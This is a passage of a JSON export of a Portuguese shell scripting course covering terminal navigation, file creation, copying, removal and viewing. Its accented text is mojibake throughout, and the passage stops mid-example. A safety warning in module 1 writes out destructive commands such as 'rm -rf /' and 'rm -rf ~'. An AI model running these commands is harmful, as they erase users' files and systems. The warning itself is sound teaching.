[
  {
    "id": "module_0",
    "course_id": "shell_script_completo",
    "title": "Mapeando o Territ√≥rio",
    "order": "0",
    "description": "Introdu√ß√£o ao ecossistema Shell/Terminal/CLI e comandos essenciais de navega√ß√£o no sistema de arquivos Linux/Unix. Os primeiros passos para se tornar um explorador do terminal.",
    "learning_objectives": [
      "Definir o que √© Shell, Terminal e Linha de Comando (CLI)",
      "Diferenciar entre GUI e CLI",
      "Utilizar o comando pwd para identificar o diret√≥rio atual",
      "Utilizar o comando ls para listar conte√∫do de diret√≥rios",
      "Utilizar o comando cd para navegar entre diret√≥rios",
      "Personalizar o prompt do terminal"
    ],
    "key_concepts": [
      "Shell - Int√©rprete entre usu√°rio e kernel",
      "Terminal - Interface gr√°fica que hospeda o Shell",
      "CLI - M√©todo de intera√ß√£o textual",
      "Prompt - Indicador de prontid√£o do terminal",
      "Caminhos absolutos e relativos",
      "Wildcards e Tab completion"
    ],
    "content": "## üåç M√ìDULO 0: Mapeando o Territ√≥rio üó∫Ô∏è\n\n> *\"Se voc√™ n√£o sabe onde est√°, qualquer caminho serve.\"*  \n> *- Lewis Carroll (adaptado para Shell)*\n\n### üåê O Ecossistema Shell/Terminal/CLI - Sua Nova Realidade\n\nImagine que voc√™ √© um explorador em um novo continente digital. Voc√™ precisa de:\n\n#### üêö O SHELL - Seu Int√©rprete Nativo\n**Fun√ß√£o Real:** Tradutor entre voc√™ e o n√∫cleo do sistema  \n**Analogia:** √â como ter um guia local que fala tanto sua l√≠ngua quanto a l√≠ngua nativa do territ√≥rio\n\n```bash\n# Exemplo: O Shell traduz seu comando para o sistema\nVoc√™ digita: \"mostre-me os arquivos aqui\"\nShell traduz: execute a fun√ß√£o list_directory(current_path)\nSistema executa: kernel.chamada_sistema('listdir', current_path)\n```\n\n**Tipos de Shell (Diferentes Dialetos):**\n- **Bash (Bourne Again Shell):** O mais comum, padr√£o na maioria dos Linux\n- **Zsh (Z Shell):** Mais moderno, com autocompletar inteligente\n- **Fish (Friendly Interactive Shell):** Colorido e amig√°vel para iniciantes\n- **PowerShell:** Para o mundo Windows, extremamente poderoso\n\n#### üñ•Ô∏è O TERMINAL - Sua Janela para o Mundo\n**Fun√ß√£o Real:** A interface f√≠sica (ou emulada) onde voc√™ interage  \n**Analogia:** A luneta atrav√©s da qual voc√™ v√™ o territ√≥rio\n\n**üöÄ DICA PR√ÅTICA:** Personalize seu terminal para ser mais produtivo:\n\n```bash\n# Adicione ao seu ~/.bashrc para um prompt informativo:\nexport PS1=\"\\u@\\h \\w \\$ \"\n# Resultado: usuario@computador ~/Documentos $\n```\n\n#### ‚å®Ô∏è A LINHA DE COMANDO (CLI) - Seu M√©todo de Explora√ß√£o\n**Fun√ß√£o Real:** Modo de intera√ß√£o textual e sequencial  \n**Analogia:** Dar instru√ß√µes passo a passo para seu guia\n\n**POR QUE CLI √â SUPERIOR PARA EXPLORA√á√ÉO?**\n1. **Reprodutibilidade:** Tudo que voc√™ faz pode ser salvo e repetido\n2. **Precis√£o:** Nada de \"clique aproximadamente aqui\"\n3. **Velocidade:** Teclado > Mouse para experts\n4. **Automa√ß√£o:** Qualquer sequ√™ncia pode virar script\n\n### üöÄ Sua Primeira Janela - Abrindo o Terminal\n\n**Linux (Ubuntu/Debian):** `Ctrl + Alt + T`  \n**MacOS:** `Cmd + Espa√ßo`, digite \"Terminal\"  \n**Windows:** `Win + R`, digite \"cmd\" ou \"powershell\"\n\n**üìå PRIMEIRA MISS√ÉO:** Encontre o terminal e abra-o. Voc√™ ver√° algo como:\n\n```\nusuario@computador:~$\n```\n\n**Decodificando o Prompt:**\n- `usuario`: Quem voc√™ √© no sistema\n- `computador`: Nome da m√°quina\n- `~`: Voc√™ est√° no diret√≥rio home (`/home/usuario`)\n- `$`: Voc√™ √© um usu√°rio normal (se fosse `#`, seria root/admin)\n\n### üìç `pwd` - Onde Estou? (Print Working Directory)\n\n**Situa√ß√£o:** Voc√™ acorda em uma floresta digital. Primeiro passo: saber sua localiza√ß√£o.\n\n```bash\n$ pwd\n/home/seu_usuario\n```\n\n**üîç DETALHES T√âCNICOS:**\n- `pwd` mostra o **caminho absoluto** - desde a raiz do sistema (`/`)\n- Sem op√ß√µes, mas tem dois modos: `-L` (l√≥gico) e `-P` (f√≠sico) para links simb√≥licos\n- Essencial para scripts saberem onde est√£o executando\n\n**üí° CASO REAL:** Voc√™ baixou um script da internet. Antes de executar:\n\n```bash\n$ pwd\n/home/usuario/Downloads\n# OK, est√° no diret√≥rio de downloads, seguro para testar\n```\n\n### üìã `ls` - O que H√° Aqui? (List)\n\n**Situa√ß√£o:** Voc√™ sabe onde est√°. Agora, olhe ao redor.\n\n#### üéØ FORMAS DE USAR `ls`:\n\n**B√°sico - A Vis√£o Panor√¢mica:**\n```bash\n$ ls\nDocumentos  Downloads  Imagens  M√∫sica  V√≠deos\n```\n\n**Detalhado - A Lupa Examinadora:**\n```bash\n$ ls -l\ntotal 48\ndrwxr-xr-x 2 usuario usuario 4096 Jan  1 10:00 Documentos\n-rw-r--r-- 1 usuario usuario 1234 Jan  1 09:30 relatorio.txt\nlrwxrwxrwx 1 usuario usuario   24 Jan  1 08:15 link -> /caminho/para/original\n```\n\n**üîë DECIFRANDO `ls -l`:**\n```\ndrwxr-xr-x 2 usuario grupo 4096 Jan 1 10:00 Documentos\n‚îú‚îÄ‚îÄ d = diret√≥rio (tipo)\n‚îú‚îÄ‚îÄ rwx = dono pode ler, escrever, executar\n‚îú‚îÄ‚îÄ r-x = grupo pode ler e executar\n‚îú‚îÄ‚îÄ r-x = outros podem ler e executar\n‚îú‚îÄ‚îÄ 2 = n√∫mero de links\n‚îú‚îÄ‚îÄ usuario = dono\n‚îú‚îÄ‚îÄ grupo = grupo\n‚îú‚îÄ‚îÄ 4096 = tamanho em bytes\n‚îî‚îÄ‚îÄ Jan 1 10:00 = √∫ltima modifica√ß√£o\n```\n\n**Op√ß√µes √öteis do `ls`:**\n\n| Op√ß√£o | Descri√ß√£o | Exemplo |\n|-------|-----------|---------|\n| `-a` | Mostra arquivos ocultos | `ls -a` |\n| `-l` | Lista detalhada | `ls -l` |\n| `-h` | Tamanhos leg√≠veis (KB, MB, GB) | `ls -lh` |\n| `-S` | Ordena por tamanho | `ls -lS` |\n| `-t` | Ordena por data (mais recente primeiro) | `ls -lt` |\n| `-r` | Ordem reversa | `ls -lr` |\n| `-R` | Recursivo (subdiret√≥rios) | `ls -R` |\n\n**üé® `ls` Colorido (Geralmente padr√£o, mas se n√£o estiver):**\n```bash\n$ ls --color=auto\n# Azul = diret√≥rios\n# Verde = execut√°veis\n# Vermelho = arquivos compactados\n# Ciano = links\n```\n\n> **üí° Dica de Mestre**  \n> Use `ls -lha` para uma listagem completa: detalhada, com arquivos ocultos e tamanhos leg√≠veis.\n\n### ‚û°Ô∏è `cd` - Navegando pelo Territ√≥rio (Change Directory)\n\n**Situa√ß√£o:** Voc√™ viu algo interessante na lista. Vamos investigar!\n\n#### üéØ CAMINHOS DE NAVEGA√á√ÉO:\n\n**Navega√ß√£o Relativa - Movendo-se Localmente:**\n```bash\n# Entrar em um subdiret√≥rio\n$ cd Documentos\n\n# Voltar um n√≠vel\n$ cd ..\n\n# Voltar ao diret√≥rio anterior\n$ cd -\n\n# Ir para o diret√≥rio home do usu√°rio\n$ cd ~\n$ cd      # Alternativa mais curta\n```\n\n**Navega√ß√£o Absoluta - Indo para Coordenadas Espec√≠ficas:**\n```bash\n# Indo diretamente para a raiz do sistema\n$ cd /\n\n# Indo para diret√≥rio espec√≠fico\n$ cd /usr/local/bin\n\n# Usando vari√°vel de ambiente\n$ cd $HOME/Documentos\n```\n\n**üí° ATALHOS PODEROSOS DO BASH:**\n```bash\n# Tab completion - seu melhor amigo\n$ cd Doc[Tab]  # Completa para \"Documentos/\"\n$ cd D[Tab][Tab]  # Mostra todas as op√ß√µes come√ßando com D\n\n# Usando wildcards\n$ cd D*tos  # Vai para o primeiro diret√≥rio que casa com o padr√£o\n```\n\n**üö® ERRO COMUM E SOLU√á√ÉO:**\n```bash\n$ cd /spasta  # Erro: diret√≥rio n√£o existe\n-bash: cd: /spasta: No such file or directory\n\n# Solu√ß√£o: verifique o nome\n$ ls / | grep spa\n$ cd /srv  # Talvez voc√™ quisesse isso\n```",
    "examples": "```bash\n# Exemplo 1: Navega√ß√£o b√°sica\n$ pwd\n/home/usuario\n$ ls\nDocumentos  Downloads  M√∫sica  Imagens\n$ cd Documentos\n$ pwd\n/home/usuario/Documentos\n$ ls -la\ntotal 16\ndrwxr-xr-x 3 usuario usuario 4096 Jan 1 10:00 .\ndrwxr-xr-x 5 usuario usuario 4096 Jan 1 09:30 ..\ndrwxr-xr-x 2 usuario usuario 4096 Jan 1 09:45 projetos\n-rw-r--r-- 1 usuario usuario  123 Jan 1 09:40 notas.txt\n\n# Exemplo 2: Navega√ß√£o com atalhos\n$ cd ~  # Volta para home\n$ cd -   # Volta para o √∫ltimo diret√≥rio\n/home/usuario/Documentos\n$ cd ../..  # Sobe dois n√≠veis\n$ pwd\n/home\n\n# Exemplo 3: Uso de wildcards\n$ mkdir -p projetos/{python,js,bash}\n$ cd projetos/p*  # Vai para projetos/python\n$ cd ../b*       # Vai para projetos/bash\n```",
    "summary": "Neste m√≥dulo voc√™ aprendeu os fundamentos do terminal: o que √© Shell, Terminal e CLI, como abrir o terminal em diferentes sistemas, e os tr√™s comandos essenciais de navega√ß√£o: `pwd` (saber onde est√°), `ls` (ver o que h√° ao redor) e `cd` (mover-se para outro lugar). Esses s√£o os pilares para qualquer explora√ß√£o no mundo da linha de comando.",
    "estimated_time_minutes": "45"
  },
  {
    "id": "module_1",
    "course_id": "shell_script_completo",
    "title": "Construindo seu Acampamento",
    "order": "1",
    "description": "Comandos fundamentais para cria√ß√£o, remo√ß√£o, c√≥pia e movimenta√ß√£o de arquivos e diret√≥rios. Kit de constru√ß√£o digital para organizar seus projetos e recursos no sistema de arquivos.",
    "learning_objectives": [
      "Criar novos diret√≥rios com mkdir",
      "Criar arquivos vazios ou atualizar timestamp com touch",
      "Copiar arquivos e diret√≥rios com cp",
      "Mover arquivos ou renomear arquivos e diret√≥rios com mv",
      "Remover arquivos com rm e diret√≥rios vazios com rmdir",
      "Entender e aplicar pr√°ticas seguras de manipula√ß√£o de arquivos"
    ],
    "key_concepts": [
      "Estrutura de diret√≥rios",
      "Timestamp de arquivos",
      "C√≥pia recursiva",
      "Remo√ß√£o segura",
      "Wildcards e expans√£o",
      "Backup e seguran√ßa"
    ],
    "content": "## ‚õ∫ M√ìDULO 1: Construindo seu Acampamento üî®\n\n> *\"Primeiro construa sua base, depois explore o mundo.\"*  \n> *- Filosofia de todo explorador experiente*\n\nUm explorador precisa de ferramentas para construir abrigos e organizar suprimentos. Estes comandos s√£o seu kit de constru√ß√£o digital, permitindo criar diret√≥rios para seus projetos e os arquivos que viver√£o dentro deles.\n\n### üìÅ `mkdir` - Criando Estruturas (Make Directory)\n\n**Situa√ß√£o:** Voc√™ encontrou um local perfeito para seu acampamento base. Hora de construir!\n\n#### üéØ CRIANDO ESTRUTURAS SIMPLES:\n\n**Diret√≥rio B√°sico - Sua Primeira Tenda:**\n```bash\n$ mkdir projetos\n$ ls\nprojetos\n```\n\n**M√∫ltiplos Diret√≥rios - Expandindo seu Acampamento:**\n```bash\n$ mkdir projetos clientes documentos\n$ ls\nprojetos  clientes  documentos\n```\n\n#### üöÄ `mkdir -p` - O SUPER PODER DA CRIA√á√ÉO RECURSIVA\n\n**Problema:** Voc√™ quer criar `ano/mes/dia`, mas `ano` n√£o existe:\n```bash\n$ mkdir 2024/01/15\nmkdir: cannot create directory '2024/01/15': No such file or directory\n```\n\n**Solu√ß√£o M√°gica:**\n```bash\n$ mkdir -p 2024/01/15\n$ tree 2024/\n2024/\n‚îî‚îÄ‚îÄ 01\n    ‚îî‚îÄ‚îÄ 15\n```\n\n**üí° CASO REAL - Estrutura de Projeto Completa:**\n```bash\n$ mkdir -p projeto/{src,test,docs,logs/{debug,error}}\n$ tree projeto/\nprojeto/\n‚îú‚îÄ‚îÄ docs\n‚îú‚îÄ‚îÄ logs\n‚îÇ   ‚îú‚îÄ‚îÄ debug\n‚îÇ   ‚îî‚îÄ‚îÄ error\n‚îú‚îÄ‚îÄ src\n‚îî‚îÄ‚îÄ test\n```\n\n**Op√ß√µes √öteis do `mkdir`:**\n\n| Op√ß√£o | Descri√ß√£o | Exemplo |\n|-------|-----------|---------|\n| `-p` | Cria diret√≥rios pais se necess√°rio | `mkdir -p a/b/c` |\n| `-v` | Modo verboso (mostra o que est√° fazendo) | `mkdir -v pasta` |\n| `-m` | Define permiss√µes espec√≠ficas | `mkdir -m 750 segredo` |\n\n> **üí° Dica de Mestre**  \n> Precisa criar uma estrutura aninhada como ano/mes/dia? Use `mkdir -p ano/mes/dia`. A flag `-p` cria todos os diret√≥rios _pais_ necess√°rios no caminho.\n\n### üìÑ `touch` - Criando e Marcando Tempo\n\n**Situa√ß√£o:** Voc√™ precisa criar arquivos de log, config ou simples marcadores.\n\n#### üéØ CRIANDO ARQUIVOS VAZIOS:\n\n**Um Arquivo por Vez:**\n```bash\n$ touch README.md\n$ ls -l README.md\n-rw-r--r-- 1 usuario usuario 0 Jan  1 11:00 README.md\n# Tamanho 0, mas criado!\n```\n\n**M√∫ltiplos Arquivos:**\n```bash\n$ touch index.html style.css script.js\n$ ls\nindex.html  script.js  style.css\n```\n\n**Com Padr√µes (Wildcards):**\n```bash\n$ touch capitulo{1..5}.txt\n$ ls\ncapitulo1.txt  capitulo2.txt  capitulo3.txt  capitulo4.txt  capitulo5.txt\n```\n\n#### üï∞Ô∏è `touch` COMO MARCADOR TEMPORAL\n\n**Problema Comum:** Voc√™ quer \"tocar\" um arquivo para atualizar sua data sem abri-lo.\n\n**Atualizando Timestamps:**\n```bash\n# Primeiro, veja a data atual\n$ ls -l backup.conf\n-rw-r--r-- 1 usuario usuario 120 Jan  1 09:00 backup.conf\n\n# Atualize para data/hora atual\n$ touch backup.conf\n$ ls -l backup.conf\n-rw-r--r-- 1 usuario usuario 120 Jan  1 11:30 backup.conf  # Atualizado!\n```\n\n**üí° CASO REAL - For√ßando Recompila√ß√£o:**\n```bash\n# Em sistemas de build, tocar um arquivo for√ßa recompila√ß√£o\n$ touch src/main.c\n$ make  # O make verifica que main.c √© mais novo e recompila\n```\n\n**Op√ß√µes √öteis do `touch`:**\n\n| Op√ß√£o | Descri√ß√£o | Exemplo |\n|-------|-----------|---------|\n| `-t` | Define timestamp espec√≠fico | `touch -t 202401011200.00 arquivo.dat` |\n| `-r` | Usa timestamp de outro arquivo | `touch -r modelo.txt novo.txt` |\n| `-c` | N√£o cria arquivo se n√£o existir | `touch -c arquivo_existente` |\n\n### üìë `cp` - A Arte da Replica√ß√£o (Copy)\n\n**Situa√ß√£o:** Voc√™ tem um template perfeito e quer replic√°-lo.\n\n#### ‚ö†Ô∏è ALERTA DE SEGURAN√áA PRIMEIRO:\n\n```bash\n# PERIGO! Sobrescreve sem avisar\n$ cp arquivo.txt destino/\n\n# SEGURO! Pede confirma√ß√£o se vai sobrescrever\n$ cp -i arquivo.txt destino/\ncp: overwrite 'destino/arquivo.txt'?\n```\n\n#### üéØ C√ìPIAS B√ÅSICAS:\n\n**Arquivo Simples:**\n```bash\n$ cp original.txt copia.txt\n$ ls\noriginal.txt  copia.txt\n```\n\n**Para um Diret√≥rio:**\n```bash\n$ cp documento.pdf backup/\n$ ls backup/\ndocumento.pdf\n```\n\n#### üöÄ `cp -r` - C√ìPIA RECURSIVA (DIRET√ìRIOS)\n\n**Diret√≥rio Inteiro:**\n```bash\n$ cp -r site/ site_backup/\n$ ls -la site_backup/\n# Conte√∫do id√™ntico ao site/\n```\n\n**Op√ß√µes Importantes do `cp`:**\n\n| Op√ß√£o | Descri√ß√£o | Exemplo |\n|-------|-----------|---------|\n| `-r` ou `-R` | Copia diret√≥rios recursivamente | `cp -r pasta/ backup/` |\n| `-i` | Modo interativo (pede confirma√ß√£o) | `cp -i arquivo.txt destino/` |\n| `-v` | Modo verboso (mostra o que est√° fazendo) | `cp -v *.txt backup/` |\n| `-a` | Archive (preserva tudo: permiss√µes, timestamps, etc) | `cp -a projeto/ projeto_backup/` |\n| `-u` | Atualiza apenas se origem for mais nova | `cp -u *.txt backup/` |\n| `-p` | Preserva atributos (permiss√µes, timestamps) | `cp -p config.txt backup/` |\n\n#### ‚ö° DICA AVAN√áADA: `rsync` - O `cp` Melhorado\n\n```bash\n# C√≥pia inteligente com progresso e retom√°vel\n$ rsync -av --progress origem/ destino/\nsending incremental file list\n./\narquivo1.txt\n           0 100%    0.00kB/s    0:00:00 (xfr#1, to-chk=2/4)\narquivo2.txt\n    1048576 100%   10.00MB/s    0:00:00 (xfr#2, to-chk=1/4)\n```\n\n### ‚û°Ô∏è `mv` - Movimento e Transforma√ß√£o (Move/Rename)\n\n**Situa√ß√£o:** Voc√™ precisa reorganizar ou renomear seus recursos.\n\n#### üéØ RENOMEANDO ARQUIVOS:\n\n**Renomea√ß√£o Simples:**\n```bash\n$ mv nome_antigo.txt nome_novo.txt\n$ ls\nnome_novo.txt  # nome_antigo.txt desapareceu (transformou-se)\n```\n\n**Renomea√ß√£o com Confirma√ß√£o:**\n```bash\n$ mv -i arquivo_velho arquivo_novo\nmv: overwrite 'arquivo_novo'? n  # N√£o sobrescrever\n```\n\n#### üöÄ MOVENDO ARQUIVOS:\n\n**Para um Diret√≥rio Existente:**\n```bash\n$ mv fotos_viagem/ Janeiro/\n$ ls Janeiro/\nfotos_viagem/  # Agora √© subdiret√≥rio de Janeiro\n```\n\n**M√∫ltiplos Arquivos:**\n```bash\n$ mv *.log logs/\n$ mv capitulo?.txt livro/\n```\n\n**Op√ß√µes √öteis do `mv`:**\n\n| Op√ß√£o | Descri√ß√£o | Exemplo |\n|-------|-----------|---------|\n| `-i` | Modo interativo (pede confirma√ß√£o) | `mv -i arquivo.txt destino/` |\n| `-v` | Modo verboso (mostra o que est√° fazendo) | `mv -v *.jpg imagens/` |\n| `-f` | For√ßa movimento (sem perguntar) | `mv -f arquivo.txt destino/` |\n| `-b` | Cria backup se destino existir | `mv -b arquivo.txt destino/` |\n| `-u` | Move apenas se origem for mais nova | `mv -u *.txt backup/` |\n\n#### ‚ö° DICA AVAN√áADA: Renomea√ß√£o em Massa com `mv` + `for`\n\n```bash\n# Renomear todas as .JPG para .jpg (min√∫sculo)\nfor arquivo in *.JPG; do\n    mv \"$arquivo\" \"${arquivo%.JPG}.jpg\"\ndone\n\n# Adicionar prefixo a todos os .txt\nfor arquivo in *.txt; do\n    mv \"$arquivo\" \"backup_$arquivo\"\ndone\n```\n\n### üí£ `rm` - Remo√ß√£o com Responsabilidade (Remove)\n\n> **‚ö†Ô∏è ALERTA DE SEGURAN√áA CR√çTICO ‚ö†Ô∏è**  \n> `rm` N√ÉO VAI PARA A LIXEIRA. √â DELETADO DO DISCO.  \n> Com `rm`, voc√™ √© um cirurgi√£o, n√£o um colecionador.\n\n#### üö® COMANDOS PERIGOSOS - NUNCA EXECUTE SEM ENTENDER:\n\n```bash\n# ‚ö†Ô∏è APAGA TUDO NO DIRET√ìRIO ATUAL\n$ rm -rf *\n\n# ‚ö†Ô∏è APAGA TUDO NO SISTEMA (SUIC√çDIO DIGITAL)\n$ rm -rf /\n\n# ‚ö†Ô∏è APAGA HOME DO USU√ÅRIO\n$ rm -rf ~\n\n# ‚ö†Ô∏è APAGA DIRET√ìRIO ERRADO\n$ rm -rf /var/log   # Ops, logs do sistema foram-se\n```\n\n#### üéØ REMO√á√ÉO SEGURA:\n\n**Arquivo √önico com Confirma√ß√£o:**\n```bash\n$ rm -i arquivo_velho.txt\nrm: remove regular file 'arquivo_velho.txt'? y\n```\n\n**V√°rios Arquivos com Padr√£o:**\n```bash\n$ rm -i *.tmp\nrm: remove regular file 'cache.tmp'? y\nrm: remove regular file 'temp.tmp'? n  # Decidiu manter este\n```\n\n**Op√ß√µes do `rm`:**\n\n| Op√ß√£o | Descri√ß√£o | Exemplo |\n|-------|-----------|---------|\n| `-i` | Modo interativo (pede confirma√ß√£o) | `rm -i arquivo.txt` |\n| `-r` ou `-R` | Remove diret√≥rios recursivamente | `rm -r pasta/` |\n| `-f` | For√ßa remo√ß√£o (sem perguntar) | `rm -f arquivo.txt` |\n| `-v` | Modo verboso (mostra o que est√° removendo) | `rm -v *.tmp` |\n\n#### ‚ö° DICA DE SEGURAN√áA: Alias Protetor\n\nAdicione ao seu `~/.bashrc`:\n```bash\n# Faz rm sempre pedir confirma√ß√£o para arquivos/diret√≥rios\nalias rm='rm -i'\n\n# Para for√ßar remo√ß√£o sem confirma√ß√£o quando necess√°rio\n$ \\rm arquivo.txt  # O \\ desabilita o alias\n```\n\n### üóëÔ∏è `rmdir` - O Removedor Conservador\n\n**Situa√ß√£o:** Voc√™ quer remover diret√≥rios, mas s√≥ se estiverem vazios.\n\n#### üéØ USO B√ÅSICO:\n\n```bash\n# Criar e remover diret√≥rio vazio\n$ mkdir teste\n$ rmdir teste\n$ ls\n# teste desapareceu\n\n# Tentar remover diret√≥rio com conte√∫do\n$ mkdir -p teste/subpasta\n$ rmdir teste\nrmdir: failed to remove 'teste': Directory not empty\n```\n\n**Op√ß√µes do `rmdir`:**\n\n| Op√ß√£o | Descri√ß√£o | Exemplo |\n|-------|-----------|---------|\n| `-p` | Remove diret√≥rios pais vazios tamb√©m | `rmdir -p a/b/c` |\n| `-v` | Modo verboso | `rmdir -v pasta_vazia` |\n\n> **üí° Dica de Mestre**  \n> Com medo de apagar algo por engano? Use a flag `-i` (interativo). `rm -i arquivo.txt`, o terminal ir√° mostrar um menu interativo para escolher a a√ß√£o desejada.",
    "examples": "```bash\n# Exemplo 1: Criando estrutura de projeto\n$ mkdir -p meu_projeto/{src/{models,controllers,views},tests,docs,logs}\n$ tree meu_projeto/\nmeu_projeto/\n‚îú‚îÄ‚îÄ docs\n‚îú‚îÄ‚îÄ logs\n‚îú‚îÄ‚îÄ src\n‚îÇ   ‚îú‚îÄ‚îÄ controllers\n‚îÇ   ‚îú‚îÄ‚îÄ models\n‚îÇ   ‚îî‚îÄ‚îÄ views\n‚îî‚îÄ‚îÄ tests\n\n# Exemplo 2: Backup e organiza√ß√£o\n$ touch relatorio_{jan,feb,mar}.txt\n$ mkdir -p 2024/backup\n$ cp -i relatorio_*.txt 2024/backup/\ncp: overwrite '2024/backup/relatorio_jan.txt'? y\n\n# Exemplo 3: Renomea√ß√£o em massa\n$ for i in {1..10}; do touch \"foto$i.jpg\"; done\n$ ls\nfoto1.jpg foto2.jpg ... foto10.jpg\n$ for arquivo in foto*.jpg; do mv \"$arquivo\" \"vacacao_$arquivo\"; done\n$ ls\nvacacao_foto1.jpg vacacao_foto2.jpg ...\n\n# Exemplo 4: Remo√ß√£o segura\n$ mkdir -p lixo/{arquivos_tmp,logs_antigos}\n$ touch lixo/arquivos_tmp/{temp1.txt,temp2.log}\n$ ls lixo/arquivos_tmp/\ntemp1.txt temp2.log\n$ rm -ri lixo/\nrm: descend into directory 'lixo'? y\nrm: descend into directory 'lixo/arquivos_tmp'? y\nrm: remove regular file 'lixo/arquivos_tmp/temp1.txt'? y\nrm: remove regular file 'lixo/arquivos_tmp/temp2.log'? y\nrm: remove directory 'lixo/arquivos_tmp'? y\nrm: remove directory 'lixo'? y\n```",
    "summary": "Neste m√≥dulo voc√™ dominou as ferramentas b√°sicas de constru√ß√£o e organiza√ß√£o no terminal: criar diret√≥rios com `mkdir`, arquivos com `touch`, copiar com `cp`, mover/renomear com `mv`, e remover com `rm`. Aprendemos a import√¢ncia da cria√ß√£o recursiva (`-p`), c√≥pia preservando atributos (`-a`), e especialmente as pr√°ticas de seguran√ßa ao usar `rm`, incluindo o uso do modo interativo (`-i`) para evitar remo√ß√µes acidentais.",
    "estimated_time_minutes": "60"
  },
  {
    "id": "module_2",
    "course_id": "shell_script_completo",
    "title": "Inspecionando seus Achados",
    "order": "2",
    "description": "T√©cnicas avan√ßadas para visualizar e analisar o conte√∫do de arquivos diretamente no terminal. Ferramentas para leitura, filtragem e busca de texto que transformam o terminal em um laborat√≥rio de an√°lise.",
    "learning_objectives": [
      "Visualizar conte√∫do de arquivos com cat, less, head e tail",
      "Buscar padr√µes de texto com grep usando express√µes regulares",
      "Realizar transforma√ß√µes de texto com sed",
      "Processar dados estruturados com awk",
      "Localizar arquivos usando crit√©rios avan√ßados com find",
      "Combinar comandos com pipes para fluxos de processamento complexos"
    ],
    "key_concepts": [
      "Visualiza√ß√£o paginada vs. direta",
      "Express√µes regulares",
      "Stream editing",
      "Processamento colunar",
      "Busca recursiva",
      "Pipes e redirecionamento",
      "Crit√©rios de busca (tamanho, data, permiss√µes)"
    ],
    "content": "## üîç M√ìDULO 2: Inspecionando seus Achados üî¶\n\n> *\"N√£o julgue um arquivo pela capa - olhe dentro dele.\"*  \n> *- Prov√©rbio do Explorador Digital*\n\nVoc√™ coletou e criou recursos, agora precisa de uma forma r√°pida de examin√°-los. Estas ferramentas s√£o sua lupa e seu bin√≥culo, permitindo que voc√™ visualize o conte√∫do de arquivos diretamente no terminal, seja ele inteiro, apenas o come√ßo ou o final.\n\n### üìñ `cat` - O Leitor R√°pido (Concatenate)\n\n**Situa√ß√£o:** Voc√™ precisa ver o conte√∫do de arquivos rapidamente.\n\n#### üéØ VISUALIZA√á√ÉO B√ÅSICA:\n\n**Um Arquivo:**\n```bash\n$ cat config.json\n{\n  \"server\": \"localhost\",\n  \"port\": 8080,\n  \"debug\": true\n}\n```\n\n**V√°rios Arquivos (Concatena√ß√£o):**\n```bash\n$ cat parte1.txt parte2.txt > livro_completo.txt\n$ wc -l livro_completo.txt\n150 livro_completo.txt  # Soma das linhas\n```\n\n**Op√ß√µes √öteis do `cat`:**\n\n| Op√ß√£o | Descri√ß√£o | Exemplo |\n|-------|-----------|---------|\n| `-n` | Mostra n√∫meros de linha | `cat -n script.sh` |\n| `-E` | Mostra fim de linha com $ | `cat -E arquivo.txt` |\n| `-s` | Comprime linhas em branco m√∫ltiplas | `cat -s log.txt` |\n| `-T` | Mostra tabs como ^I | `cat -T arquivo.txt` |\n| `-A` | Equivale a -vET (mostra tudo) | `cat -A arquivo.txt` |\n\n#### üí° CASOS REAIS:\n\n**Criando Arquivo R√°pido:**\n```bash\n$ cat > instrucoes.txt << EOF\n> 1. Execute o script\n> 2. Verifique logs\n> 3. Reporte erros\n> EOF\n$ cat instrucoes.txt\n1. Execute o script\n2. Verifique logs\n3. Reporte erros\n```\n\n### üìö `less` - O Navegador de Arquivos Pesados\n\n**Situa√ß√£o:** Arquivo de 1GB de log? `cat` vai travar seu terminal. Use `less`.\n\n#### üéØ ABRINDO ARQUIVOS:\n\n```bash\n$ less arquivo_grande.log\n# Voc√™ entra em um visualizador interativo\n```\n\n#### üïπÔ∏è COMANDOS DO `less` (Dentro do Visualizador):\n\n| Tecla | A√ß√£o | Equivalente GUI |\n|-------|------|-----------------|\n| `Espa√ßo` | P√°gina para baixo | Scroll down |\n| `b` | P√°gina para cima | Scroll up |\n| `g` | Ir para in√≠cio | Home |\n| `G` | Ir para fim | End |\n| `/texto` | Buscar para frente | Ctrl+F |\n| `?texto` | Buscar para tr√°s | Ctrl+B |\n| `n` | Pr√≥xima ocorr√™ncia | F3 |\n| `N` | Ocorr√™ncia anterior | Shift+F3 |\n| `q` | Sair | Fechar janela |\n\n**Op√ß√µes √öteis do `less`:**\n\n| Op√ß√£o | Descri√ß√£o | Exemplo |\n|-------|-----------|---------|\n| `-N` | Mostra n√∫meros de linha | `less -N codigo_fonte.py` |\n| `-S` | N√£o quebra linhas longas | `less -S arquivo.txt` |\n| `+F` | Segue arquivo (como tail -f) | `less +F servidor.log` |\n| `-p \"padr√£o\"` | Abre destacando padr√£o | `less -p \"ERROR\" app.log` |\n\n### ‚¨ÜÔ∏è `head` - As Primeiras Impress√µes\n\n**Situa√ß√£o:** \"S√≥ quero dar uma olhada no come√ßo deste arquivo enorme.\"\n\n#### üéØ USO B√ÅSICO:\n\n**Primeiras 10 Linhas (padr√£o):**\n```bash\n$ head database_dump.sql\n-- MySQL dump\n-- Host: localhost\n-- Database: app_db\n-- ...\n```\n\n**Primeiras N Linhas:**\n```bash\n$ head -20 relatorio.csv\ndata,valor,cliente\n2024-01-01,100.50,Jo√£o\n2024-01-02,200.00,Maria\n...\n```\n\n**Op√ß√µes √öteis do `head`:**\n\n| Op√ß√£o | Descri√ß√£o | Exemplo |\n|-------|-----------|---------|\n| `-n N` | Mostra N linhas | `head -n 5 arquivo.txt` |\n| `-c N` | Mostra N bytes | `head -c 100 imagem.jpg` |\n| `-n -N` | Mostra tudo exceto √∫ltimas N linhas | `head -n -5 arquivo.txt` |\n\n#### üí° CASO REAL: Verificando Cabe√ßalho de CSV\n\n```bash\n$ head -1 dados.csv | tr ',' '\n' | cat -n\n     1  id\n     2  nome\n     3  email\n     4  data_cadastro\n# Agora voc√™ sabe as colunas sem abrir o arquivo inteiro\n```\n\n### ‚¨áÔ∏è `tail` - As √öltimas Not√≠cias\n\n**Situa√ß√£o:** \"O que aconteceu recentemente no log? O erro foi agora h√° pouco?\"\n\n#### üéØ USO B√ÅSICO:\n\n**√öltimas 10 Linhas (padr√£o):**\n```bash\n$ tail auth.log\nJan  1 10:30:01 server sshd[1234]: Accepted password for user\nJan  1 10:31:22 server sshd[1235]: Failed password for root\n```\n\n**√öltimas N Linhas:**\n```bash\n$ tail -50 servidor.log\n# √öltimas 50 linhas do log\n```\n\n#### üöÄ `tail -f` - O SUPER PODER DO MONITORAMENTO\n\n**Seguindo Arquivo em Tempo Real:**\n```bash\n$ tail -f 